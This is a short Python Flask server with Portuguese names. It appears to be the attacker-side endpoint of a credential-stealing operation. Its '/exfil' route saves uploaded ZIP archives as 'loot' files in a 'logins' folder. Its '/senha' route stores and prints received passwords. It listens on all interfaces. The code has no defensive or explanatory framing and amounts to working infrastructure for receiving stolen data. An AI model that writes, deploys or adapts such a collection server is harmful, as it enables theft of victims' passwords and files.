from flask import Flask, request
import os
from datetime import datetime

app = Flask(__name__)

if not os.path.exists("logins"):
    os.makedirs("logins")

@app.route('/exfil', methods=['POST'])
def receber_zip():
    if 'file' not in request.files:
        return "Arquivo não enviado", 400
    arquivo = request.files['file']
    nome = f"saque_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    caminho = os.path.join("logins", nome)
    arquivo.save(caminho)
    print(f"[+] ZIP recebido: {nome}")
    return "OK", 200

@app.route('/senha', methods=['POST'])
def receber_senha():
    dados = request.get_data(as_text=True)
    nome = f"senha_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(os.path.join("logins", nome), 'w') as f:
        f.write(dados)
    print(f"[+] Senha recebida: {dados}")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)